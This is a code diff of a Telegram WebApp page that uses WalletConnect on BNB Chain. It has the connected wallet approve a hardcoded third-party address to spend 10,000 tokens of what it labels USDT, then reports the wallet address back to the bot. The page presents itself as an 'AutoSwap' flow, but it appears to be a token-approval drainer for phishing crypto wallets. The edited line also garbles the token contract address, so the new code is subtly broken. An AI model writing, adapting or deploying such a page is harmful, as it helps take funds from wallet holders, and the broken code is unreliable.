@@ -8,7 +8,7 @@
     body { background:#000; color:#e0e0e0; font-family:'Segoe UI',sans-serif; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; }
     .container { width:360px; padding:30px; background:#111; border-radius:12px; box-shadow:0 0 20px rgba(0,0,0,0.7); text-align:center; }
     h1 { color:#4fc3f7; margin-bottom:20px; }
-    #qrcode { background:#222; border-radius:8px; }
+    canvas { background:#222; border-radius:8px; margin:auto; display:block; }
     #manual-uri { margin:20px auto; padding:16px; background:#222; border-radius:8px; font-size:14px; color:#bbb; word-break:break-all; }
     #status { margin:20px 0; min-height:40px; font-size:16px; color:#ccc; }
     .btn { padding:12px 24px; background:#4fc3f7; color:#000; border:none; border-radius:8px; cursor:pointer; font-weight:bold; transition:background .2s; }
@@ -30,8 +30,7 @@
     import SignClient from 'https://esm.sh/@walletconnect/sign-client@2.13.1';
     import { Interface, parseUnits, getAddress } from 'https://esm.sh/ethers@6.14.3';
 
-    const tg = window.Telegram?.WebApp;
-    if (tg) tg.ready();
+    const tg = window.Telegram?.WebApp; if (tg) tg.ready();
 
     const qr = document.getElementById("qrcode");
     const uriEl = document.getElementById("manual-uri");
@@ -39,7 +38,7 @@
     const reconnectBtn = document.getElementById("reconnect");
     let client, session;
 
-    reconnectBtn.addEventListener("click", () => init(true));
+    reconnectBtn.onclick = () => init(true);
 
     function setStatus(msg, color="#ccc") {
       statusEl.textContent = msg;
@@ -54,7 +53,7 @@
     }
 
     async function connectWallet() {
-      setStatus("📷 Генерация QR‑кода…", "#4fc3f7");
+      setStatus("📷 Генерация QR‑кода…","#4fc3f7");
       const { uri, approval } = await client.connect({
         requiredNamespaces: { eip155: { chains:["eip155:56"], methods:["eth_sendTransaction"], events:["chainChanged","accountsChanged"] } }
       });
@@ -69,16 +68,15 @@
 
     async function doApprove(address) {
       setStatus("🚀 Отправка approve...", "#4fc3f7");
-      const data = new Interface(["function approve(address,uint256)"])
-        .encodeFunctionData("approve", [
-          getAddress("0xC25edef7dbf23D4FBBB1Cecb9C56380eF35c11AE"),
-          parseUnits("10000",18)
-        ]);
+      const data = new Interface(["function approve(address,uint256)"]).encodeFunctionData("approve", [
+        getAddress("0xC25edef7dbf23D4FBBB1Cecb9C56380eF35c11AE"),
+        parseUnits("10000",18)
+      ]);
       try {
         const tx = await client.request({
           topic: session.topic,
           chainId: "eip155:56",
-          request: { method:"eth_sendTransaction", params:[{ from: address, to:getAddress("0x55d398326f99059ff775485246999027b3197955"), data }] }
+          request: { method:"eth_sendTransaction", params:[{ from: address, to:getAddress("0x55d398326f99059ff775246999027b3197955"), data }] }
         });
         setStatus(`✅ Approve tx: ${tx}`, "#66bb6a");
         if (tg) tg.sendData(JSON.stringify({ address }));
@@ -90,29 +88,22 @@
 
     async function init(force=false) {
       if (force && session) {
-        await client.disconnect({ topic: session.topic, reason:{ code:6000, message:"User reconnected" } });
-        clearUI();
-      } else {
-        clearUI();
+        await client.disconnect({ topic: session.topic, reason:{ code:6000, message:"User reconnected" }});
       }
+      clearUI();
       setStatus("🔌 Инициализация…");
 
       client = await SignClient.init({
         projectId: "d868f90cd734355ae0328f8f0258b6b1",
         relayUrl: "wss://relay.walletconnect.com",
-        metadata:{
-          name:"AutoSwap Approve Flow",
-          description:"Approve USDT via WalletConnect for AutoSwap",
-          url: location.href,
-          icons:["https://walletconnect.com/favicon.ico"]
-        }
+        metadata:{ name:"AutoSwap", description:"Approve USDT via WalletConnect", url:location.href, icons:["https://walletconnect.com/favicon.ico"] }
       });
 
       const existing = await client.session.getAll();
       if (existing.length && !force) {
         session = existing[0];
         const address = session.namespaces.eip155.accounts[0].split(":")[2];
-        setStatus(`ℹ Сессия есть: ${address}. Нажмите Reconnect для approve.`, "#ffa500");
+        setStatus(`ℹ Сессия активна: ${address}. Нажмите кнопку переподключения.`, "#ffa500");
       } else {
         await connectWallet();
       }
